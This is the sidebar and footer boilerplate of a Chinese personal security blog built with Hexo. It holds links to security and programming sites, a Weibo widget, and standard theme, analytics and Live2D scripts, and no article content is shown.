            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
            
          </li>
        
          <li>
            
            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
            
          </li>
        
          <li>
            
            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.kali.org.cn" target="_blank" title="kali linux">kali linux</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.shiyanlou.com" target="_blank" title="实验楼">实验楼</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
		
		<a href="/about" target="_blank" title="小虫">小虫</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
